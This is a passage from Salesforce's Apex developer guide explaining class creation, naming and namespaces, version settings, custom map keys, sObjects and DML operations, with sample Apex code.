method or variable as `global` , you must also declare the class that contains it as `global` . Methods and classes are final by default. The `virtual` definition modifier allows extension and overrides. The `override` keyword must be used explicitly on methods that override base class methods. Methods defined in an interface have the same access modifier ( `public` or `global` ) as the interface. Exception classes must extend either exception or another user-defined exception. Their names must end with the word `exception` . Exception classes have four implicit constructors that are built-in, although you can add others. Classes and interfaces can be defined in triggers and anonymous blocks, but only as local. Exceptions in Apex

### Class Definition Creation

Use the class editor to create a class in Salesforce. **1.** From Setup, enter `Apex` `Classes` in the `Quick` `Find` box, then select **Apex Classes** . **2.** Click **New** . **3.** Click **Version Settings** to specify the version of Apex and the API used with this class. If your organization has installed managed packages from the AppExchange, you can also specify which version of each managed package to use with this class. Use the default values for all versions. This associates the class with the most recent version of Apex and the API, as well as each managed package. You can specify an older version of a managed package if you want to access components or functionality that differs from the most recent package version. You can specify an older version of Apex and the API to maintain specific behavior. **4.** In the class editor, enter the Apex code for the class. A single class can be up to 1 million characters in length, not including comments, test methods, or classes defined using `@IsTest` . **5.** Click **Save** to save your changes and return to the class detail screen, or click **Quick Save** to save your changes and continue editing your class. Your Apex class must compile correctly before you can save your class. Classes can also be automatically generated from a WSDL by clicking **Generate from WSDL** . See SOAP Services: Defining a Class from a WSDL Document on page 615. Once saved, classes can be invoked through class methods or variables by other Apex code, such as a trigger. To aid backwards-compatibility, classes are stored with the version settings for a specified version of Apex and the API. If the Apex class references components, such as a custom object, in installed managed packages, the version settings for each managed package referenced by the class is saved too. Additionally, classes are stored with an `isValid` flag that is set to `true` as long as dependent metadata hasn’t changed since the class was last compiled. If any changes are made to object names or fields that are used in the class, including superficial changes such as edits to an object or field description, or if changes are made to a class that calls this class, the `isValid` flag is set to `false` . When a trigger or Web service call invokes the class, the code is recompiled and the user is notified if there are any errors. If there are no errors, the `isValid` flag is reset to `true` .

#### The Apex Class Editor

The Apex and Visualforce editor has the following functionality: **Syntax highlighting** The editor automatically applies syntax highlighting for keywords and all functions and operators. **Search (** **)** Search enables you to search for text within the current page, class, or trigger. To use search, enter a string in the `Search` textbox and click **Find Next** . To replace a found search string with another string, enter the new string in the `Replace` textbox and click **replace** to replace just that instance, or **Replace All** to replace that instance and all other instances of the search string that occur in the page, class, or trigger. To make the search operation case sensitive, select the **Match Case** option. To use a regular expression as your search string, select the **Regular Expressions** option. The regular expressions follow JavaScript's regular expression rules. A search using regular expressions can find strings that wrap over more than one line. If you use the replace operation with a string found by a regular expression, the replace operation can also bind regular expression group variables ( `$1` , `$2` , and so on) from the found search string. For example, to replace an `<h1` `>` tag with an `<h2` `>` tag and keep all the attributes on the original `<h1` `>` intact, search for `<h1(\s+)(.*)` `>` and replace it with `<h2$1$2` `>` . **Go to line (** **)** This button allows you to highlight a specified line number. If the line isn’t currently visible, the editor scrolls to that line. **Undo (** **) and Redo (** **)** Use undo to reverse an editing action and redo to recreate an editing action that was undone. **Font size** Select a font size from the dropdown list to control the size of the characters displayed in the editor. **Line and column position** The line and column position of the cursor is displayed in the status bar at the bottom of the editor. This can be used with go to line ( ) to quickly navigate through the editor. **Line and character count** The total number of lines and characters is displayed in the status bar at the bottom of the editor. 1. Naming Conventions 2. Name Shadowing

#### Naming Conventions

We recommend following Java standards for naming, that is, classes start with a capital letter, methods start with a lowercase verb, and variable names should be meaningful. It is not legal to define a class and interface with the same name in the same class. It is also not legal for an inner class to have the same name as its outer class. However, methods and variables have their own namespaces within the class so these three types of names do not clash with each other. In particular it is legal for a variable, method, and a class within a class to have the same name. Variables

#### Name Shadowing

Member variables can be shadowed by local variables—in particular function arguments. This allows methods and constructors of the standard Java form:

```apex
Public Class Shadow {
```

```apex
String s;
Shadow(String s) { this.s = s; } // Same name ok
setS(String s) { this.s = s; } // Same name ok
}
```

Member variables in one class can shadow member variables with the same name in a parent classes. This can be useful if the two classes are in different top-level classes and written by different teams. For example, if one has a reference to a class C and wants to gain access to a member variable M in parent class P (with the same name as a member variable in C) the reference should be assigned to a reference to P first. Static variables can be shadowed across the class hierarchy—so if P defines a static S, a subclass C can also declare a static S. References to S inside C refer to that static—in order to reference the one in P, the syntax P.S must be used. Static class variables cannot be referenced through a class instance. They must be referenced using the raw variable name by itself (inside that top-level class file) or prefixed with the class name. For example:

```apex
public class p1 {
```

```apex
public static final Integer CLASS_INT = 1;
public class c { };
}
p1.c c = new p1.c();
// This is illegal
// Integer i = c.CLASS_INT;
// This is correct
Integer i = p1.CLASS_INT;
```

### Namespace Prefix

The Salesforce application supports the use of namespace prefixes . Namespace prefixes are used in managed AppExchange packages to differentiate custom object and field names from names used by other organizations. When creating a namespace, use something that’s useful and informative to users. However, don’t name a namespace after a person (for example, by using a person's name, nickname, or private information). Once namespaces are assigned, they cannot be changed. After a developer registers a globally unique namespace prefix and registers it with AppExchange registry, external references to custom object and field names in the developer's managed packages take on the following long format:

```apex
namespace_prefix__obj_or_field_name__c
```

These fully qualified names can be onerous to update in working SOQL or SOSL statements, and Apex once a class is marked as “managed”. Therefore, Apex supports a default namespace for schema names. When looking at identifiers, the parser assumes that the namespace of the current object is the namespace of all other objects and fields unless otherwise specified. Therefore, a stored class must refer to custom object and field names directly (using `obj_or_field_name` `__c` ) for those objects that are defined within its same application namespace. Only use namespace prefixes when referring to custom objects and fields in managed packages that have been installed to your organization from the AppExchange.

#### Using Namespaces When Invoking Package Methods

To invoke a method that is defined in a managed package, Apex allows fully qualified identifiers of the form:

```apex
namespace_prefix.class.method(args)
```

#### Versioned Behavior Changes

In API version 34.0 and later, Schema.DescribeSObjectResult on a custom SObjectType includes map keys prefixed with the namespace, even if the namespace is that of currently executing code. If you work with multiple namespaces and generate runtime describe data, make sure that your code accesses keys correctly using the namespace prefix. 1. Using the System Namespace 2. Using the Schema Namespace The `Schema` namespace provides classes and methods for working with schema metadata information. We implicitly import `Schema.*` , but you must fully qualify your uses of `Schema` namespace elements when they have naming conflicts with items in your unmanaged code. If your org contains an Apex class that has the same name as an sObject, add the `Schema` namespace prefix to the sObject name in your code. 3. Namespace, Class, and Variable Name Precedence 4. Type Resolution and System Namespace for Types

#### Using the System Namespace

The `System` namespace is the default namespace in Apex. This means that you can omit the namespace when creating a new instance of a system class or when calling a system method. For example, because the built-in URL class is in the `System` namespace, both of these statements to create an instance of the `URL` class are equivalent:

```apex
System.URL url1 = new System.URL('https://MyDomainName.my.salesforce.com/');
```

And:

```apex
URL url1 = new URL('https://MyDomainName.my.salesforce.com/');
```

Similarly, to call a static method on the `URL` class, you can write either of the following:

```apex
System.URL.getCurrentRequestUrl();
```

Or:

```apex
URL.getCurrentRequestUrl();
```

In addition to the `System` namespace, there is a built-in `System` class in the `System` namespace, which provides methods like `assertEquals` and `debug` . Don’t get confused by the fact that both the namespace and the class have the same name in this case. The `System.debug(` `'debug` `message` `');` and `System.System.debug(` `'debug` `message` `');` statements are equivalent. It is easier to not include the `System` namespace when calling static methods of system classes, but there are situations where you must include the `System` namespace to differentiate the built-in Apex classes from custom Apex classes with the same name. If your organization contains Apex classes that you’ve defined with the same name as a built-in class, the Apex runtime defaults to your custom class and calls the methods in your class. Let’s take a look at the following example. Create this custom Apex class:

```apex
public class Database {
```

```apex
public static String query() {
```

```apex
return 'wherefore art thou namespace?';
}
}
```

Execute this statement in the Developer Console:

```apex
sObject[] acct = Database.query('SELECT Name FROM Account LIMIT 1');
System.debug(acct[0].get('Name'));
```

When the `Database.query` statement executes, Apex looks up the query method on the custom `Database` class first. However, the query method in this class doesn’t take any parameters and no match is found, hence you get an error. The custom `Database` class overrides the built-in `Database` class in the `System` namespace. To solve this problem, add the `System` namespace prefix to the class name to explicitly instruct the Apex runtime to call the query method on the built-in Database class in the `System` namespace:

```apex
sObject[] acct = System.Database.query('SELECT Name FROM Account LIMIT 1');
System.debug(acct[0].get('Name'));
```

Using the Schema Namespace

#### Using the Schema Namespace

The `Schema` namespace provides classes and methods for working with schema metadata information. We implicitly import `Schema.*` , but you must fully qualify your uses of `Schema` namespace elements when they have naming conflicts with items in your unmanaged code. If your org contains an Apex class that has the same name as an sObject, add the `Schema` namespace prefix to the sObject name in your code. You can omit the namespace when creating an instance of a schema class or when calling a schema method. For example, because the `DescribeSObjectResult` and `FieldSet` classes are in the `Schema` namespace, these code segments are equivalent.

```apex
Schema.DescribeSObjectResult d = Account.sObjectType.getDescribe();
Map<String, Schema.FieldSet> FSMap = d.fieldSets.getMap();
```

And:

```apex
DescribeSObjectResult d = Account.sObjectType.getDescribe();
Map<String, FieldSet> FSMap = d.fieldSets.getMap();
```

Use `Schema.` `object_name` to refer to an sObject that has the same name as a custom class. This disambiguation instructs the Apex runtime to use the sObject.

```apex
public class Account {
```

```apex
public Integer myInteger;
}
```

```apex
// ...
```

```apex
// Create a standard Account object myAccountSObject
Schema.Account myAccountSObject = new Schema.Account();
// Create accountClassInstance, a custom class in your org
Account accountClassInstance = new Account();
myAccountSObject.Name = 'Snazzy Account';
accountClassInstance.myInteger = 1;
```

Using the System Namespace

#### Namespace, Class, and Variable Name Precedence

Because local variables, class names, and namespaces can all hypothetically use the same identifiers, the Apex parser evaluates expressions in the form of `name1.name2.[...].nameN` as follows: **1.** The parser first assumes that `name1` is a local variable with `name2` - `nameN` as field references. **2.** If the first assumption does not hold true, the parser then assumes that `name1` is a class name and `name2` is a static variable name with `name3` - `nameN` as field references. **3.** If the second assumption does not hold true, the parser then assumes that `name1` is a namespace name, `name2` is a class name, `name3` is a static variable name, and `name4` - `nameN` are field references. **4.** If the third assumption does not hold true, the parser reports an error. If the expression ends with a set of parentheses (for example, `name1.name2.[...].nameM.nameN()` ), the Apex parser evaluates the expression as follows: **1.** The parser first assumes that `name1` is a local variable with `name2` - `nameM` as field references, and `nameN` as a method invocation. **2.** If the first assumption does not hold true: If the expression contains only two identifiers ( `name1.name2()` ), the parser then assumes that `name1` is a class name and `name2` is a method invocation. If the expression contains more than two identifiers, the parser then assumes that `name1` is a class name, `name2` is a static variable name with `name3` - `nameM` as field references, and `nameN` is a method invocation. **3.** If the second assumption does not hold true, the parser then assumes that `name1` is a namespace name, `name2` is a class name, `name3` is a static variable name, `name4` - `nameM` are field references, and `nameN` is a method invocation. **4.** If the third assumption does not hold true, the parser reports an error. However, with class variables Apex also uses dot notation to reference member variables. Those member variables might refer to other class instances, or they might refer to an sObject which has its own dot notation rules to refer to field names (possibly navigating foreign keys). Once you enter an sObject field in the expression, the remainder of the expression stays within the sObject domain, that is, sObject fields cannot refer back to Apex expressions. For instance, if you have the following class:

```apex
public class c {
c1 c1 = new c1();
class c1 { c2 c2; }
class c2 { Account a; }
}
```

Then the following expressions are all legal:

```apex
c.c1.c2.a.name
c.c1.c2.a.owner.lastName.toLowerCase()
c.c1.c2.a.tasks
c.c1.c2.a.contacts.size()
```

#### Type Resolution and System Namespace for Types

Because the type system must resolve user-defined types defined locally or in other classes, the Apex parser evaluates types as follows: **1.** For a type reference `TypeN` , the parser first looks up that type as a scalar type. **2.** If `TypeN` is not found, the parser looks up locally defined types. **3.** If `TypeN` still is not found, the parser looks up a class of that name. **4.** If `TypeN` still is not found, the parser looks up system types such as sObjects. For the type `T1.T2` this could mean an inner type `T2` in a top-level class `T1` , or it could mean a top-level class `T2` in the namespace `T1` (in that order of precedence).

### Apex Code Versions

To aid backwards-compatibility, classes and triggers are stored with the version settings for a specific Salesforce API version. If an Apex class or trigger references components, such as a custom object, in installed managed packages, the version settings for each managed package referenced by the class are saved too. This ensures that as Apex, the API, and the components in managed packages evolve in subsequent released versions, a class or trigger is still bound to versions with specific, known behavior. Setting a version for an installed package determines the exposed interface of any Apex code in the installed package. This allows you to continue to reference Apex that may be deprecated in the latest version of an installed package, if you installed a version of the package before the code was deprecated. Typically, you reference the latest Salesforce API version and each installed package version. If you save an Apex class or trigger without specifying the Salesforce API version, the class or trigger is associated with the latest installed version by default. If you save or redeploy an Apex class or trigger that references a managed package without specifying a version of the managed package, the class or trigger is associated with the latest installed version of the managed package by default.

#### Versioning of Apex Classes and Methods

When classes and methods are added to the Apex language, those classes and methods are available to all API versions your Apex code is saved with, regardless of the API version (Salesforce release) they were introduced in. For example, if a method was added in API version 33.0, you can use this method in a custom class saved with API version 33.0 or another class saved with API version 25.0. There is one exception to this rule. The classes and methods of the `ConnectApi` namespace are supported only in the API versions specified in the documentation. For example, if a class or method is introduced in API version 33.0, it is not available in earlier versions. For more information, see ConnectApi Versioning and Equality Checking on page 463. Keep these guidelines in mind regarding API version usage: Salesforce strongly recommends that you use the latest available API version. If you can't upgrade to the latest version yet, use API versions released in the past three years, for improved performance, security, and compatibility. To reduce complexity, consolidate your Apex codebase to use the minimal number of API versions, ideally, just one API version. For a non-exhaustive list of major Apex behavior changes across API versions, organized by version number, see Apex Versioned Behavior Changes on page 793. Setting the Salesforce API Version for Classes and Triggers Setting Package Versions for Apex Classes and Triggers As a managed package subscriber, you can specify which package version that your managed Apex classes and triggers use. Use Apex Referenced by Managed Packages

#### Setting the Salesforce API Version for Classes and Triggers

To set the Salesforce API and Apex version for a class or trigger: **1.** Edit either a class or trigger, and click **Version Settings** . **2.** Select the `Version` of the Salesforce API. This version is also the version of Apex associated with the class or trigger. **3.** Click **Save** . If you pass an object as a parameter in a method call from one Apex class, C1, to another class, C2, and C2 has different fields exposed due to the Salesforce API version setting, the fields in the objects are controlled by the version settings of C2. In this example, the `Categories` field is set to `null` after calling the `insertIdea` method in class C2 from a method in the test class C1, because the `Categories` field isn’t available in version 13.0 of the API. The first class is saved using Salesforce API version 13.0:

```apex
// This class is saved using Salesforce API version 13.0
// Version 13.0 does not include the Idea.categories field
global class C2
{
```

```apex
global Idea insertIdea(Idea a) {
```

```apex
insert a; // category field set to null on insert
```

```apex
// retrieve the new idea
Idea insertedIdea = [SELECT title FROM Idea WHERE Id =:a.Id];
```

```apex
return insertedIdea;
}
}
```

The following class is saved using Salesforce API version 16.0:

```apex
@IsTest
// This class is bound to API version 16.0 by Version Settings
private class C1
{
```

```apex
static testMethod void testC2Method() {
Idea i = new Idea();
i.CommunityId = '09aD000000004YCIAY';
i.Title = 'Testing Version Settings';
i.Body = 'Categories field is included in API version 16.0';
i.Categories = 'test';
```

```apex
C2 c2 = new C2();
Idea returnedIdea = c2.insertIdea(i);
// retrieve the new idea
Idea ideaMoreFields = [SELECT title, categories FROM Idea
WHERE Id = :returnedIdea.Id];
```

```apex
// assert that the categories field from the object created
// in this class is not null
System.assert(i.Categories != null);
// assert that the categories field created in C2 is null
System.assert(ideaMoreFields.Categories == null);
}
}
```

#### Setting Package Versions for Apex Classes and Triggers

As a managed package subscriber, you can specify which package version that your managed Apex classes and triggers use. In Summer ’25 and later, package subscribers can use version settings to specify the version of a migrated second-generation managed package (2GP) that an Apex class or trigger depends on. This functionality is already available to first-generation managed packages (1GP), but isn’t yet supported in 2GP packages that weren’t converted from a 1GP package. See Apex Version Settings in Migrated Second-Generation Managed Packages (2GP) . To configure the package version settings for a class or trigger: **1.** From Setup, enter `Apex` `Classes` or `Apex` `Triggers` in the Quick Find box, and then select **Apex Classes** or **Apex Triggers** . **2.** From the list, click **Edit** for the Apex class or trigger that you want to configure. **3.** Click the **Version Settings** tab. **4.** From the Version dropdown for the managed package, select the desired version referenced by the class or trigger. The class or trigger continues to use this version even if you install later versions of the managed package, unless you manually update the version setting. **5.** Click **Save** . When working with package version settings, keep these considerations in mind. By default, an Apex class or trigger that references a managed package is associated with the version of the package installed when that class or trigger was last saved or deployed. If a class or trigger references a managed package, you can’t remove the package’s version settings for that class or trigger. To find where the class or trigger references a managed package, on the class or trigger’s Detail page, click **Show Dependencies** . You can also set the package version for an Apex class or trigger through metadata deployments or with API requests. See Set Package Versions for Apex Classes and Triggers on page 782. Use Apex Referenced by Managed Packages

### Lists of Custom Types and Sorting

Lists can hold objects of your user-defined types (your Apex classes). Lists of user-defined types can be sorted. To sort such a list, your Apex class can implement the `Comparator` interface and pass it as a parameter to the `List.sort` method. Alternatively, your Apex class can implement the `Comparable` interface. The sort criteria and sort order depend on the implementation that you provide for the `Comparable.compareTo` or the `Comparator.compare` method. To perform locale-sensitive comparisons and sorting, use the `Collator` class. Because locale-sensitive sorting can produce different results depending on the user running the code, avoid using it in triggers or in code that expects a particular sort order. Apex Reference Guide : Collator Class Apex Reference Guide : Comparable Interface Apex Reference Guide : Comparator Interface

### Using Custom Types in Map Keys and Sets

You can add instances of your own Apex classes to maps and sets. For maps, instances of your Apex classes can be added either as keys or values. If you add them as keys, there are some special rules that your class must implement for the map to function correctly; that is, for the key to fetch the right value. Similarly, if set elements are instances of your custom class, your class must follow those same rules. If the object in your map keys or set elements changes after being added to the collection, it won’t be found anymore because of changed field values. When using a custom type (your Apex class) for the map key or set elements, provide `equals` and `hashCode` methods in your class. Apex uses these two methods to determine equality and uniqueness of keys for your objects.

#### Adding equals and hashCode Methods to Your Class

To ensure that map keys of your custom type are compared correctly and their uniqueness can be determined consistently, provide an implementation of the following two methods in your class: The `equals` method with this signature:

```apex
public Boolean equals(Object obj) {
```

```apex
// Your implementation
}
```

The `hashCode` method with this signature:

```apex
public Integer hashCode() {
```

```apex
// Your implementation
}
```

#### Sample

This sample shows how to implement the `equals` and `hashCode` methods. The class that provides those methods is listed first. It also contains a constructor that takes two Integers. The second example is a code snippet that creates three objects of the class, two of which have the same values. Next, map entries are added using the pair objects as keys. The sample verifies that the map has only two entries since the entry that was added last has the same key as the first entry, and hence, overwrote it. The sample then uses the `==` operator, which works as expected because the class implements `equals` . Also, some additional map operations are performed, like checking whether the map contains certain keys, and writing all keys and values to the debug log. Finally, the sample creates a set and adds the same objects to it. It verifies that the set size is two, since only two objects out of the three are unique.

```apex
public class PairNumbers {
```

```apex
Integer x,y;
```

```apex
public PairNumbers(Integer a, Integer b) {
x=a;
y=b;
}
```

```apex
public Boolean equals(Object obj) {
```

```apex
if (obj instanceof PairNumbers) {
PairNumbers p = (PairNumbers)obj;
return ((x==p.x) && (y==p.y));
}
return false;
}
```

```apex
public Integer hashCode() {
```

```apex
return (31 * x) ^ y;
}
}
```

This code snippet makes use of the `PairNumbers` class.

```apex
Map<PairNumbers, String> m = new Map<PairNumbers, String>();
PairNumbers p1 = new PairNumbers(1,2);
PairNumbers p2 = new PairNumbers(3,4);
// Duplicate key
PairNumbers p3 = new PairNumbers(1,2);
m.put(p1, 'first');
m.put(p2, 'second');
m.put(p3, 'third');
```

```apex
// Map size is 2 because the entry with
// the duplicate key overwrote the first entry.
System.assertEquals(2, m.size());
```

```apex
// Use the == operator
if (p1 == p3) {
System.debug('p1 and p3 are equal.');
}
```

```apex
// Perform some other operations
System.assertEquals(true, m.containsKey(p1));
System.assertEquals(true, m.containsKey(p2));
System.assertEquals(false, m.containsKey(new PairNumbers(5,6)));
```

```apex
for(PairNumbers pn : m.keySet()) {
System.debug('Key: ' + pn);
}
```

```apex
List<String> mValues = m.values();
System.debug('m.values: ' + mValues);
```

```apex
// Create a set
Set<PairNumbers> s1 = new Set<PairNumbers>();
s1.add(p1);
s1.add(p2);
s1.add(p3);
```

```apex
// Verify that we have only two elements
// since the p3 is equal to p1.
System.assertEquals(2, s1.size());
```

## Working with Data in Apex

You can add and interact with data in the Lightning Platform persistence layer. The sObject data type is the main data type that holds data objects. You’ll use Data Manipulation Language (DML) to work with data, and use query languages to retrieve data, such as the (), among other things. Working with sObjects In this developer guide, the term `sObject` refers to any object that can be stored in the Lightning platform database. Data Manipulation Language Apex enables you to insert, update, delete or restore data in the database. DML operations allow you to modify records one at a time or in batches. SOQL and SOSL Queries You can evaluate Salesforce Object Query Language (SOQL) or Salesforce Object Search Language (SOSL) statements on-the-fly in Apex by surrounding the statement in square brackets. SOQL For Loops SOQL `for` loops iterate over all of the sObject records returned by a SOQL query. sObject Collections You can manage sObjects in lists, sets, and maps. Dynamic Apex Apex Security and Sharing Model The Apex security model includes record-level, field-level, and object-level security mechanisms. You can control record-level security modes by using the `with` `sharing` , `without` `sharing` , and `inherited` `sharing` keywords on classes. Apex runs in user mode by default, which means that user permissions on objects and field-level security are respected. A user cannot run code that tries to access fields or objects that are hidden from the user. Other security mechanisms include the `Security.stripInaccessible()` method, and Field and SObject describe methods. Custom Settings Custom settings are similar to custom objects. Application developers can create custom sets of data and associate custom data for an organization, profile, or specific user. All custom settings data is exposed in the application cache, which enables efficient access without the cost of repeated queries to the database. Formula fields, validation rules, flows, Apex, and SOAP API can then use this data.

### Working with sObjects

In this developer guide, the term `sObject` refers to any object that can be stored in the Lightning platform database. sObject Types An sObject variable represents a row of data and can only be declared in Apex using SOAP API name of the object. Accessing SObject Fields Validating sObjects and Fields

#### sObject Types

An sObject variable represents a row of data and can only be declared in Apex using SOAP API name of the object. For example:

```apex
Account a = new Account();
MyCustomObject__c co = new MyCustomObject__c();
```

Similar to SOAP API, Apex allows the use of the generic sObject abstract type to represent any object. The sObject data type can be used in code that processes different types of sObjects. The `new` operator still requires a concrete sObject type, so all instances are specific sObjects. For example:

```apex
sObject s = new Account();
```

You can also use casting between the generic sObject type and the specific sObject type. For example:

```apex
// Cast the generic variable s from the example above
// into a specific account and account variable a
Account a = (Account)s;
// The following generates a runtime error
Contact c = (Contact)s;
```

Because sObjects work like objects, you can also have the following:

```apex
Object obj = s;
// and
a = (Account)obj;
```

DML operations work on variables declared as the generic sObject data type as well as with regular sObjects. sObject variables are initialized to `null` , but can be assigned a valid object reference with the `new` operator. For example:

```apex
Account a = new Account();
```

Developers can also specify initial field values with comma-separated `name` `=` `value` pairs when instantiating a new sObject. For example:

```apex
Account a = new Account(name = 'Acme', billingcity = 'San Francisco');
```

For information on accessing existing sObjects from the Lightning Platform database, see “SOQL and SOSL Queries” in the SOQL and SOSL Reference . The Lightning Platform assigns ID values automatically when an object record is initially inserted to the database for the first time. For more information see Lists on page 29. Custom labels aren’t standard sObjects. You can’t create a new instance of a custom label. You can only access the value of a custom label using `system.label.` `label_name` . For example:

```apex
String errorMsg = System.Label.generic_error;
```

For more information on custom labels, see “Custom Labels” in Salesforce Help.

#### Accessing SObject Fields

As in Java, SObject fields can be accessed or changed with simple dot notation. For example:

```apex
Account a = new Account();
a.Name = 'Acme';
// Access the account name field and assign it 'Acme'
```

System-generated fields, such as `Created` `By` or `Last` `Modified` `Date` , cannot be modified. If you try, the Apex runtime engine generates an error. Additionally, formula field values and values for other fields that are read-only for the context user cannot be changed. If you use the generic SObject type instead of a specific object, such as Account, you can retrieve only the `Id` field using dot notation. You can set the `Id` field for Apex code saved using Salesforce API version 27.0 and later). Alternatively, you can use the generic SObject `put` and `get` methods. See SObject Class . This example shows how you can access the `Id` field and operations that aren’t allowed on generic SObjects.

```apex
Account a = new Account(Name = 'Acme', BillingCity = 'San Francisco');
insert a;
sObject s = [SELECT Id, Name FROM Account WHERE Name = 'Acme' LIMIT 1];
// This is allowed
ID id = s.Id;
// The following line results in an error when you try to save
String x = s.Name;
// This line results in an error when you try to save using API version 26.0 or earlier
s.Id = [SELECT Id FROM Account WHERE Name = 'Acme' LIMIT 1].Id;
```

If your organization has enabled person accounts, you have two different kinds of accounts: business accounts and person accounts. If your code creates a new account using `name` , a business account is created. If your code uses `LastName` , a person account is created. If you want to perform operations on an SObject, it is recommended that you first convert it into a specific object. For example:

```apex
Account a = new Account(Name = 'Acme', BillingCity = 'San Francisco');
insert a;
sObject s = [SELECT Id, Name FROM Account WHERE Name = 'Acme' LIMIT 1];
ID id = s.ID;
Account convertedAccount = (Account)s;
convertedAccount.name = 'Acme2';
update convertedAccount;
Contact sal = new Contact(FirstName = 'Sal', Account = convertedAccount);
```

The following example shows how you can use SOSL over a set of records to determine their object types. Once you have converted the generic SObject record into a Contact, Lead, or Account, you can modify its fields accordingly:

```apex
public class convertToCLA {
List<Contact> contacts = new List<Contact>();
List<Lead> leads = new List<Lead>();
```

```apex
List<Account> accounts = new List<Account>();
```

```apex
public void convertType(String phoneNumber) {
List<List<SObject>> results = [FIND :phoneNumber
IN Phone FIELDS
RETURNING Contact(Id, Phone, FirstName, LastName),
Lead(Id, Phone, FirstName, LastName),
Account(Id, Phone, Name)];
List<SObject> records = new List<SObject>();
records.addAll(results[0]); //add Contact results to our results super-set
records.addAll(results[1]); //add Lead results
records.addAll(results[2]); //add Account results
```

```apex
if (!records.isEmpty()) {
```

```apex
for (Integer i = 0; i < records.size(); i++) {
SObject record = records[i];
if (record.getSObjectType() == Contact.sObjectType) {
contacts.add((Contact) record);
} else if (record.getSObjectType() == Lead.sObjectType){
leads.add((Lead) record);
} else if (record.getSObjectType() == Account.sObjectType) {
accounts.add((Account) record);
}
}
}
}
}
```

SObject fields can be initially set or not set (unset); unset fields are not the same as null or blank fields. When you perform a DML operation on an SObject, you can change a field that is set; you can’t change unset fields. To erase the current value of a field, set the field to null. If an Apex method takes an SObject parameter, you can use the System.isSet() method to identify the set fields. If you want to unset any fields to retain their values, first create an SObject instance. Then apply only the fields you want to be part of the DML operation. This example code shows how SObject fields are identified as set or unset.

```apex
Contact nullFirst = new Contact(LastName='Codey', FirstName=null);
System.assertEquals(true, nullFirst.isSet('FirstName'), 'FirstName is set to a literal
value, so it counts as set');
Contact unsetFirst = new Contact(LastName='Astro');
System.assertEquals(false, unsetFirst.isSet('FirstName'), ‘FirstName is not set’);
```

An expression with SObject fields of type Boolean evaluates to true only if the SObject field is true. If the field is false or null, the expression evaluates to false. This example code shows an expression that checks if the `IsActive` field of a Campaign object is null. Because this expression always evaluates to false, the code in the `if` statement is never executed.

```apex
Campaign cObj= new Campaign();
...
```

```apex
if (cObj.IsActive == null) {
... // IsActive is evaluated to false and this code block is not executed.
```

```apex
}
```

#### Validating sObjects and Fields

When Apex code is parsed and validated, all sObject and field references are validated against actual object and field names, and a parse-time exception is thrown when an invalid name is used. In addition, the Apex parser tracks the custom objects and fields that are used, both in the code's syntax as well as in embedded SOQL and SOSL statements. The platform prevents users from making the following types of modifications when those changes cause Apex code to become invalid: Changing a field or object name Converting from one data type to another Deleting a field or object Making certain organization-wide changes, such as record sharing, field history tracking, or record types

### Data Manipulation Language

Apex enables you to insert, update, delete or restore data in the database. DML operations allow you to modify records one at a time or in batches. How DML Works Adding and Retrieving Data With DML Apex is tightly integrated with the Lightning Platform persistence layer. Records in the database can be inserted and manipulated through Apex directly using simple statements. The language in Apex that allows you to add and manage records in the database is the Data Manipulation Language (DML). In contrast to the SOQL language, which is used for read operations (querying records), DML is used for write operations. DML Statements vs. Database Class Methods Apex offers two ways to perform DML operations: using DML statements or Database class methods. This provides flexibility in how you perform data operations. DML statements are more straightforward to use and result in exceptions that you can handle in your code. DML Operations As Atomic Transactions DML Operations Using DML, you can insert new records and commit them to the database. You can also update the field values of existing records. Exception Handling More About DML Here are some things you may want to know about using Data Manipulation Language. Locking Records When an sObject record is locked, no other client or user is allowed to make updates either through code or the Salesforce user interface. The client locking the records can perform logic on the records and make updates with the guarantee that the locked records won’t be changed by another client during the lock period.

#### How DML Works

You can perform DML operations either on a single sObject, or in bulk on a list of sObjects. Performing bulk DML operations is the recommended way because it helps avoid hitting governor limits, such as the DML limit of 150 statements per Apex transaction. This limit is in place to ensure fair access to shared resources in the Lightning Platform. Performing a DML operation on a list of sObjects counts as one DML statement, not as one statement for each sObject. This example performs DML calls on single sObjects, which isn’t efficient. The `for` loop iterates over contacts. For each contact, if the department field matches a certain value, it sets a new value for the Description field. If the list contains more than items, the 151st update returns an exception that can't be caught.

```apex
List<Contact> conList = [Select Department , Description from Contact];
for(Contact badCon : conList) {
```

```apex
if (badCon.Department == 'Finance') {
badCon.Description = 'New description';
}
// Not a good practice since governor limits might be hit.
update badCon;
}
```

This example is a modified version of the previous example that doesn't hit the governor limit. The DML operation is performed in bulk by calling `update` on a list of contacts. This code counts as one DML statement, which is far below the limit of 150.

```apex
// List to hold the new contacts to update.
List<Contact> updatedList = new List<Contact>();
List<Contact> conList = [Select Department , Description from Contact];
for(Contact con : conList) {
```

```apex
if (con.Department == 'Finance') {
con.Description = 'New description';
// Add updated contact sObject to the list.
updatedList.add(con);
}
}
```

```apex
// Call update on the list of contacts.
// This results in one DML call for the entire list.
update updatedList;
```

Another DML governor limit is the total number of rows that can be processed by DML operations in a single transaction, which is 10,000. All rows processed by all DML calls in the same transaction count incrementally toward this limit. For example, if you insert 100 contacts and update 50 contacts in the same transaction, your total DML processed rows are 150. You still have 9,850 rows left (10,000 - 150). Most DML operations execute in user context, which means that the current user's permissions, field-level security, organization-wide defaults, position in the role hierarchy, and sharing rules are enforced. See Apex Security and Sharing Model . With DML on SObjects, it’s best to construct new instances and only update the fields you wish to modify without querying other fields. If you query fields other than the fields you wish to update, you may revert queried field values that could have changed between the query and the DML.

#### Adding and Retrieving Data With DML

Apex is tightly integrated with the Lightning Platform persistence layer. Records in the database can be inserted and manipulated through Apex directly using simple statements. The language in Apex that allows you to add and manage records in the database is the Data Manipulation Language (DML). In contrast to the SOQL language, which is used for read operations (querying records), DML is used for write operations. Before inserting or manipulating records, record data is created in memory as sObjects. The sObject data type is a generic data type and corresponds to the data type of the variable that will hold the record data. There are specific data types, subtyped from the sObject data type, which correspond to data types of standard object records, such as Account or Contact, and custom objects, such as Invoice_Statement__c. Typically, you will work with these specific sObject data types. But sometimes, when you don’t know the type of the sObject in advance, you can work with the generic sObject data type. This is an example of how you can create a new specific Account sObject and assign it to a variable.

```apex
Account a = new Account(Name='Account Example');
```

In the previous example, the account referenced by the variable `a` exists in memory with the required `Name` field. However, it is not persisted yet to the Lightning Platform persistence layer. You need to call DML statements to persist sObjects to the database. Here is an example of creating and persisting this account using the `insert` statement.

```apex
Account a = new Account(Name='Account Example');
insert a;
```

